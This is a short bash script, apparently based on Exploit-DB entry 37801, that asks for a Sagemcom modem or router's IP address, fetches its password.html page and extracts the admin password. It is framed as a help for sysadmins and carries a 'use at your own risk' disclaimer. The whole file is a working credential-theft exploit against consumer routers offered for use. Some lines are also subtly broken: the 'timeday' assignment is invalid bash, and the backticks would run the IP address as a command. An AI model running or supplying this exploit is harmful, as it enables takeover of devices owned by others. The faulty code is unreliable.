#!/bin/bash
#
#  This script is based off the information published to Exploit-DB at this link
#       https://www.exploit-db.com/exploits/37801
#
#   It's goal in life is to make those sysadmins lives easier in getting the password 
#   that they do not have originally.
#
#   Use at your own risk, and I'm not responsible for any malicious use of this tool
#       kthx baii <3

timeday = date +%s
clear
echo "Please enter the IP of sagemcomm Modem/Router"
echo ""
read IP_ADDRESS 
wget "http://$IP_ADDRESS/password.html" --output-document=/tmp/`$IP_ADDRESS`_`$timeday`.html
USER_PASSWORD=`wget http://$IP_ADDRESS/password.html -t 1 -q -O -  | grep "pwdAdmin" | tr " = " "\n" | grep "'" | tr -d "';" `
echo "admin password = $USER_PASSWORD"